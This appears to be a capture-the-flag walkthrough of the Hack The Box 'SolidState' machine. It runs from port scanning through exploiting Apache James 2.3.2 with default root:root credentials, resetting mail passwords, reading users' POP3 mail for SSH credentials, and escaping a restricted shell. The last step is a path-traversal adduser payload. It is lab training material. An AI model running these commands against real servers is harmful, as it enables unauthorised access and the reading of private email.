# Hack the Box - SolidState

```CSS
Machine IP: 10.10.10.51 - Linux
Difficulty: Medium
Category: OSCP Preparation
Vulnerabilities:
  - 
```

# Reconnaissance
  - Scan for open TCP ports on target machine.
  - Perform service and version detection of open ports.

## Port Scan
```CSS
▶ nmap -Pn -sS -O -p- 10.10.10.51 -T4 --min-rate 1000 -oN ports.nmap

Nmap scan report for 10.10.10.51
Host is up (0.18s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/7%OT=22%CT=1%CU=37112%PV=Y%DS=2%DC=I%G=Y%TM=6457A8C8
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11
OS:NW7%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.67 seconds
```

## Service and Version Detection
```CSS
▶ nmap -sC -sV -p 22,25,80,110,119,4555 10.10.10.51 -oN services.nmap

Nmap scan report for 10.10.10.51
Host is up (0.23s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 770084f578b9c7d354cf712e0d526d8b (RSA)
|   256 78b83af660190691f553921d3f48ed53 (ECDSA)
|_  256 e445e9ed074d7369435a12709dc4af76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.24 [10.10.14.24])
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.93%I=7%D=5/7%Time=6457C059%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPle
SF:ase\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswor
SF:d:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 270.27 seconds
```

![image](https://user-images.githubusercontent.com/83878909/236687327-996643f3-8f36-450d-8d69-aefc5ca035ff.png)

---

# Enumeration
## Port 22 - SSH
  - The OpenSSH version that is running is not associated with any critical vulnerabilities, so it’s unlikely to gain initial access through this port, unless some valid credentials are found.

---

## Port 25 - SMTP
  - Service and Version: `James smtpd 2.3.2`
```CSS
▶ searchsploit james 2.3.2
```
![image](https://user-images.githubusercontent.com/83878909/236688076-9a3abaef-62ed-443e-96ad-1e902cd6a14b.png)

---

## Port 80 - HTTP
![image](https://user-images.githubusercontent.com/83878909/236688134-0d9eac62-a0d4-4172-b2e6-cade79213572.png)

### Content Discovery
  - Brute-force directories.
```CSS
▶ gobuster dir --url http://10.10.10.51 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --threads 25
```
![image](https://user-images.githubusercontent.com/83878909/236745375-9142a91b-f442-4716-a2d2-a6a2db5766df.png)

---

# Exploit

## Initial Foothold
  - Apache James Server 2.3.2 - Remote Command Execution using default credentials.
  - Execute the exploit.
  - Connect to the target using netcat.
  - Login using the credentials: `root:root`.

### Download Exploit
```CSS
▶ searchsploit -m linux/remote/35513.py
```

### Run Exploit
```CSS
▶ python2 35513.py 10.10.10.51
```
![image](https://user-images.githubusercontent.com/83878909/236746610-285d13e2-4f47-4622-a773-d2e1a743ac2f.png)

### Connect to Target
```CSS
▶ nc 10.10.10.51 4555
```
![image](https://user-images.githubusercontent.com/83878909/236746370-6adb3b95-83e9-4ab4-b182-1f9eae2bd06f.png)

  - List all mail accounts using the command `listusers`.
![image](https://user-images.githubusercontent.com/83878909/236747526-8b0e75ab-02b4-4a01-9f49-e2ab4130bebd.png)

  - Change the password of the `mailadmin` user account using the command `setpassword`.
![image](https://user-images.githubusercontent.com/83878909/236747790-6eae3333-52cf-44a6-afa3-237bab43889f.png)

### Access User E-mail Account
  - Use `telnet` to access the email account of user `mailadmin`.
```
▶ telnet 10.10.10.51 110
```
![image](https://user-images.githubusercontent.com/83878909/236748853-bb598a85-1114-41b9-b645-14389fc798d8.png)
  - No email were found.

### Inspect All User E-mail Accounts
  - Change the password of all user e-mail accounts.
  - Access all email accounts using telnet.
  - Check for interesting information by inspecting emails in all accounts.

#### Change Passwords
![image](https://user-images.githubusercontent.com/83878909/236750391-5ebf01b4-0eb4-4bbe-b757-cb9875eb12d4.png)

#### Check E-mails
```
RETR 1
```
  - User `john`.
![image](https://user-images.githubusercontent.com/83878909/236751189-78724c43-ea2d-4d66-bcb7-f46062a502e3.png)

  - User `mindy`.
```
RETR 2
```
![image](https://user-images.githubusercontent.com/83878909/236751675-ca0a8ff0-2899-4649-8d68-855893b0fbf5.png)
  - SSH Credentials: `mindy:P@55W0rd1!2@`

### SSH
```CSS
▶ ssh mindy@10.10.10.51
```
![image](https://user-images.githubusercontent.com/83878909/236756135-c2652272-d7e1-4eed-b8f3-3e40b2d98b21.png)
![image](https://user-images.githubusercontent.com/83878909/236762145-7aa8329a-e138-4463-84cf-1711df9524ab.png)

---

# Privilege Escalation
### Restricted Bash Shell
```CSS
mindy@solidstate:~$ cat /etc/passwd
```
![image](https://user-images.githubusercontent.com/83878909/236760143-8d145c84-ff6d-4423-a934-ea6297aefc00.png)

### Restricted Bash to Bash Shell Escape
```CSS
▶ sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash
```

### Restricted Bash to Bash Shell Escape
  - Read here: https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html#intended-path
  - Add User: `hardyboy`
```CSS
adduser ../../../../../../../../etc/bash_completion.d hardyboy
```
![image](https://user-images.githubusercontent.com/83878909/236778269-50d42f3d-ffb2-46c0-9cf9-3646cb038f16.png)
